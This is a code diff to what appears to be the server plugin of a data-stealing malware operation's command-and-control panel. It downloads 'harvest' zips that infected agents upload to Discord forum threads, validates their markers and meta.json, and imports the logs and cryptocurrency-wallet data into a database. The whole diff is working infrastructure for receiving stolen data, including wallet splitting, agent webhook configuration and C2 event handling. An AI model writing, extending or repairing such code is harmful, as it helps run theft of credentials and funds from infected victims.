@@ -2005,9 +2005,53 @@ async function discordBotFetch(path, { method = "GET", raw = false } = {}) {
   return res.json();
 }
 
+const STUART_HARVEST_MARKER = "STUART_HARVEST_ID:";
+
+/** True if Discord message text looks like a real Stuart agent upload. */
+function isValidStuartMessage(msg) {
+  const c = String(msg?.content || "");
+  if (c.includes(STUART_HARVEST_MARKER)) return true;
+  if (c.includes("**Stuart harvest**") && c.includes("Client:")) return true;
+  return false;
+}
+
+function parseHarvestIdFromMessage(msg) {
+  const c = String(msg?.content || "");
+  const m = c.match(/STUART_HARVEST_ID:\s*`?([A-Za-z0-9._-]+)`?/);
+  return m ? m[1] : null;
+}
+
+/** Inspect zip meta.json — must be Stuart-origin. */
+function inspectStuartZip(buf) {
+  try {
+    const entries = unzipAll(buf);
+    for (const ent of entries) {
+      if (baseName(ent.name) !== "meta.json") continue;
+      const meta = JSON.parse(ent.data.toString("utf8"));
+      if (meta?.source !== "stuart") return { ok: false, reason: "source!=stuart" };
+      const kind = meta.kind || "logs";
+      return {
+        ok: true,
+        kind,
+        clientId: meta.clientId || null,
+        harvestId: meta.harvestId || null,
+        meta,
+      };
+    }
+    return { ok: false, reason: "no meta.json" };
+  } catch (e) {
+    return { ok: false, reason: e.message };
+  }
+}
+
+function isStuartZipFilename(name) {
+  const n = String(name || "").toLowerCase();
+  if (!n.endsWith(".zip")) return false;
+  return n.startsWith("stuart-") || n.includes("stuart-");
+}
+
 async function listForumThreadIds(channelId) {
   const ids = new Set();
-  // Active threads for guild
   try {
     const ch = await discordBotFetch(`/channels/${channelId}`);
     const guildId = ch?.guild_id;
@@ -2020,7 +2064,6 @@ async function listForumThreadIds(channelId) {
   } catch (e) {
     console.warn("[stuart] active threads:", e.message);
   }
-  // Public archived forum posts
   try {
     let before = "";
     for (let page = 0; page < 5; page++) {
@@ -2040,6 +2083,10 @@ async function listForumThreadIds(channelId) {
   return [...ids];
 }
 
+/**
+ * Manual poll: only import threads that validate as Stuart harvest posts.
+ * Skips random forum posts, non-stuart zips, already-imported attachments.
+ */
 async function pollDiscordOnce() {
   if (discordPollRunning) return { ok: false, skipped: true, reason: "poll already running" };
   if (!isDiscordPollConfigured()) {
@@ -2051,15 +2098,12 @@ async function pollDiscordOnce() {
 
   discordPollRunning = true;
   let imported = 0;
+  let skippedInvalid = 0;
   const errors = [];
   try {
     const channelId = pluginSettings.discord_forum_channel_id;
     const threadIds = await listForumThreadIds(channelId);
-    const db = pluginCtx.db;
-    const seenStmt = db.prepare(`SELECT 1 FROM discord_imports WHERE attachment_id = ?`);
-    const insImport = db.prepare(
-      `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
-    );
+    const prefix = (pluginSettings.discord_thread_prefix || "Stuart").toLowerCase();
 
     for (const threadId of threadIds) {
       let messages;
@@ -2069,32 +2113,40 @@ async function pollDiscordOnce() {
         errors.push(`thread ${threadId}: ${e.message}`);
         continue;
       }
-      for (const msg of messages || []) {
-        for (const att of msg.attachments || []) {
-          const name = (att.filename || "").toLowerCase();
-          if (!name.endsWith(".zip")) continue;
-          if (!name.includes("stuart") && !name.includes("kematian")) continue;
-          if (seenStmt.get(att.id)) continue;
-          try {
-            // Prefer proxy_url / url with bot auth when needed
-            const url = att.url || att.proxy_url;
-            const res = await fetch(url, {
-              headers: { Authorization: `Bot ${pluginSettings.discord_bot_token.trim()}` },
-            });
-            if (!res.ok) throw new Error(`download ${res.status}`);
-            const zipBuf = Buffer.from(await res.arrayBuffer());
-            const result = importZipIntoDb(db, zipBuf, null);
-            insImport.run(att.id, msg.id, threadId, result.clientId, att.filename || name, Date.now());
-            imported++;
-            console.log(`[stuart] imported Discord zip ${att.filename} → client ${result.clientId}`);
-            try {
-              pluginCtx.broadcast("harvest_update", { clientId: result.clientId, source: "discord" });
-            } catch (_) {}
-          } catch (e) {
-            errors.push(`${att.filename}: ${e.message}`);
-            console.error("[stuart] import attachment failed:", e.message);
-          }
+      if (!messages?.length) {
+        skippedInvalid++;
+        continue;
+      }
+      // Forum: oldest message is usually the starter (last in list with default newest-first)
+      const starter = [...messages].reverse().find(m => isValidStuartMessage(m)) || messages.find(m => isValidStuartMessage(m));
+      if (!starter) {
+        // Also allow thread name prefix filter without marker (legacy)
+        let threadMeta = null;
+        try { threadMeta = await discordBotFetch(`/channels/${threadId}`); } catch (_) {}
+        const tname = String(threadMeta?.name || "").toLowerCase();
+        if (!tname.startsWith(prefix) && !tname.includes("stuart")) {
+          skippedInvalid++;
+          continue;
         }
+        // still require at least one message with stuart zip filename
+        const hasStuartZip = messages.some(m =>
+          (m.attachments || []).some(a => isStuartZipFilename(a.filename))
+        );
+        if (!hasStuartZip) {
+          skippedInvalid++;
+          continue;
+        }
+      }
+
+      const harvestId = starter ? parseHarvestIdFromMessage(starter) : null;
+      try {
+        const r = await importDiscordThread(pluginCtx, null, String(threadId), {
+          harvestId,
+          requireValid: true,
+        });
+        imported += (r?.importedCount || 0);
+      } catch (e) {
+        errors.push(`import ${threadId}: ${e.message}`);
       }
     }
 
@@ -2103,9 +2155,9 @@ async function pollDiscordOnce() {
       lastOk: errors.length === 0,
       lastError: errors.slice(0, 3).join("; "),
       imported,
-      message: `threads=${threadIds.length} imported=${imported}`,
+      message: `threads=${threadIds.length} imported=${imported} skippedInvalid=${skippedInvalid}`,
     };
-    return { ok: true, threads: threadIds.length, imported, errors };
+    return { ok: true, threads: threadIds.length, imported, skippedInvalid, errors };
   } catch (e) {
     discordPollStatus = {
       lastAt: Date.now(),
@@ -2157,73 +2209,106 @@ async function pushDiscordConfigToAgent(ctx, clientId) {
 }
 
 /**
- * After agent posts to Discord webhook, pull attachments from that thread only and import.
+ * Import one Discord forum thread (single agent post).
+ * Validates Stuart markers / meta before import — skips invalid posts.
+ * @param {{ harvestId?: string, requireValid?: boolean }} opts
  */
-async function importDiscordThread(ctx, clientId, threadId) {
+async function importDiscordThread(ctx, clientId, threadId, opts = {}) {
   pluginCtx = ctx;
   if (!stmts || !ctx?.db) throw new Error("plugin not ready");
   if (!pluginSettings.discord_bot_token) throw new Error("bot token required to download Discord attachments");
 
-  console.log(`[stuart] importing Discord thread ${threadId} for client ${clientId}`);
-  const messages = await discordBotFetch(`/channels/${threadId}/messages?limit=50`);
+  const requireValid = opts.requireValid !== false;
+  const wantHarvest = opts.harvestId || null;
+
+  console.log(`[stuart] importing Discord thread ${threadId} client=${clientId || "?"} harvest=${wantHarvest || "any"}`);
+
+  // Retry: Discord CDN / thread indexing can lag right after webhook upload
+  let messages = null;
+  for (let attempt = 1; attempt <= 4; attempt++) {
+    try {
+      messages = await discordBotFetch(`/channels/${threadId}/messages?limit=100`);
+      if (messages?.length) break;
+    } catch (e) {
+      console.warn(`[stuart] fetch thread messages attempt ${attempt}: ${e.message}`);
+    }
+    await new Promise(r => setTimeout(r, 800 * attempt));
+  }
+  if (!messages?.length) {
+    console.warn(`[stuart] no messages in thread ${threadId}`);
+    return { ok: false, reason: "no messages", importedCount: 0 };
+  }
+
+  // Validate post is Stuart (any message with marker)
+  const validMsgs = messages.filter(isValidStuartMessage);
+  if (requireValid && !validMsgs.length) {
+    console.warn(`[stuart] skip thread ${threadId}: no STUART_HARVEST_ID / Stuart harvest marker`);
+    return { ok: false, reason: "invalid post (no Stuart marker)", importedCount: 0 };
+  }
+  if (wantHarvest) {
+    const match = validMsgs.some(m => (parseHarvestIdFromMessage(m) || "") === wantHarvest);
+    if (!match && requireValid) {
+      // still allow if zip meta has harvestId
+      console.log(`[stuart] message harvest id not found in text; will filter by zip meta harvestId=${wantHarvest}`);
+    }
+  }
+
   const zips = [];
-  for (const msg of messages || []) {
+  for (const msg of messages) {
     for (const att of msg.attachments || []) {
-      const name = (att.filename || "").toLowerCase();
-      if (!name.endsWith(".zip")) continue;
-      if (ctx.db.prepare(`SELECT 1 FROM discord_imports WHERE attachment_id = ?`).get(att.id)) {
-        continue;
-      }
+      if (!isStuartZipFilename(att.filename)) continue;
+      if (ctx.db.prepare(`SELECT 1 FROM discord_imports WHERE attachment_id = ?`).get(att.id)) continue;
       try {
         const buf = await downloadDiscordAttachment(att);
-        zips.push({ att, buf, msg });
+        const info = inspectStuartZip(buf);
+        if (!info.ok) {
+          console.warn(`[stuart] skip invalid zip ${att.filename}: ${info.reason}`);
+          continue;
+        }
+        if (wantHarvest && info.harvestId && info.harvestId !== wantHarvest) {
+          console.warn(`[stuart] skip zip ${att.filename}: harvestId mismatch`);
+          continue;
+        }
+        zips.push({ att, buf, msg, info });
       } catch (e) {
         console.warn(`[stuart] download ${att.filename}: ${e.message}`);
       }
     }
   }
   if (!zips.length) {
-    console.warn(`[stuart] no new zip attachments in thread ${threadId}`);
-    return { ok: false, reason: "no attachments" };
+    console.warn(`[stuart] no valid new Stuart zips in thread ${threadId}`);
+    return { ok: false, reason: "no valid attachments", importedCount: 0 };
   }
 
-  // Split log containers vs wallet containers by inspecting meta after unzip
   const logParts = [];
   const walletParts = [];
+  let resolvedClient = clientId;
   for (const z of zips) {
-    let kind = "logs";
-    try {
-      const entries = unzipAll(z.buf);
-      for (const ent of entries) {
-        if (baseName(ent.name) === "meta.json") {
-          const meta = JSON.parse(ent.data.toString("utf8"));
-          if (meta.kind === "wallets" || meta.kind === "wallet_chunk") kind = "wallets";
-          if (meta.clientId) clientId = meta.clientId;
-          break;
-        }
-      }
-    } catch (_) {}
+    if (z.info.clientId) resolvedClient = z.info.clientId;
     const part = { zip: z.buf, filename: z.att.filename, size: z.buf.length };
-    if (kind === "wallets") walletParts.push(part);
+    if (z.info.kind === "wallets" || z.info.kind === "wallet_chunk") walletParts.push(part);
     else logParts.push(part);
 
     ctx.db.prepare(
       `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
-    ).run(z.att.id, z.msg.id, threadId, clientId, z.att.filename || "", Date.now());
+    ).run(z.att.id, z.msg.id, threadId, resolvedClient || "unknown", z.att.filename || "", Date.now());
   }
 
   let importedLogs = null;
   let importedWallets = null;
+  let importedCount = 0;
   if (logParts.length) {
     try {
-      importedLogs = await importThisWebhookZip(ctx.db, null, clientId, logParts);
+      importedLogs = await importThisWebhookZip(ctx.db, null, resolvedClient, logParts);
+      importedCount += logParts.length;
     } catch (e) {
       console.error("[stuart] log import from Discord thread:", e.message);
     }
   }
   if (walletParts.length) {
     try {
-      importedWallets = importWalletPartsIntoDb(ctx.db, clientId, walletParts);
+      importedWallets = importWalletPartsIntoDb(ctx.db, resolvedClient, walletParts);
+      importedCount += importedWallets?.imported || walletParts.length;
     } catch (e) {
       console.error("[stuart] wallet import from Discord thread:", e.message);
     }
@@ -2233,14 +2318,22 @@ async function importDiscordThread(ctx, clientId, threadId) {
     lastAt: Date.now(),
     lastOk: true,
     lastError: "",
-    imported: (importedLogs?.parts || 0) + (importedWallets?.imported || 0),
-    message: `thread ${threadId}: logs=${logParts.length} walletParts=${walletParts.length}`,
+    imported: importedCount,
+    message: `thread ${threadId}: logs=${logParts.length} wallets=${walletParts.length} client=${resolvedClient}`,
   };
   try {
-    ctx.broadcast("harvest_update", { clientId, source: "discord", threadId });
+    ctx.broadcast("harvest_update", { clientId: resolvedClient, source: "discord", threadId });
   } catch (_) {}
-  console.log(`[stuart] Discord thread import done client=${clientId} logs=${logParts.length} wallets=${walletParts.length}`);
-  return { ok: true, logParts: logParts.length, walletParts: walletParts.length, importedLogs, importedWallets };
+  console.log(`[stuart] Discord thread import done client=${resolvedClient} logs=${logParts.length} wallets=${walletParts.length}`);
+  return {
+    ok: true,
+    logParts: logParts.length,
+    walletParts: walletParts.length,
+    importedLogs,
+    importedWallets,
+    importedCount,
+    clientId: resolvedClient,
+  };
 }
 
 function runPurge(db) {
@@ -2958,31 +3051,36 @@ export default {
     };
 
     if (event === "discord_upload_complete") {
-      // Agent uploaded log+wallet zips directly to Discord webhook (HTTP).
-      // Import THAT forum thread only — no bulk harvest over C2 WebSocket.
+      // Agent uploaded ALL files into ONE Discord forum post (HTTP webhook).
+      // Import THAT thread only — validate Stuart harvest marker / harvestId.
       const threadId = payload?.threadId || payload?.channel_id;
+      const harvestId = payload?.harvestId || null;
       console.log(
         `[stuart] agent Discord upload complete client=${clientId} thread=${threadId} ` +
-        `wallets=${payload?.wallets} history=${payload?.history}`
+        `harvest=${harvestId} wallets=${payload?.wallets} history=${payload?.history}`
       );
       if (!threadId) {
         console.warn("[stuart] discord_upload_complete missing threadId");
         return;
       }
-      if (!isDiscordPollConfigured()) {
-        console.warn("[stuart] bot token + forum channel id required to import agent Discord uploads");
+      if (!pluginSettings.discord_bot_token) {
+        console.warn("[stuart] bot token required to import agent Discord uploads");
         try {
           ctx.broadcast("discord_upload_pending", {
             clientId,
             threadId,
-            error: "Set Discord bot token + forum channel id so the server can import the post",
+            error: "Set Discord bot token so the server can download the post attachments",
           });
         } catch (_) {}
         return;
       }
-      importDiscordThread(ctx, clientId, String(threadId)).catch(e =>
-        console.error("[stuart] importDiscordThread:", e.message)
-      );
+      // Small delay so Discord finishes indexing attachments, then import this thread only
+      setTimeout(() => {
+        importDiscordThread(ctx, clientId, String(threadId), {
+          harvestId,
+          requireValid: true,
+        }).catch(e => console.error("[stuart] importDiscordThread:", e.message));
+      }, 1500);
       return;
     } else if (event === "ready") {
       // Push webhook config so auto-harvest can upload to Discord without WS bulk data
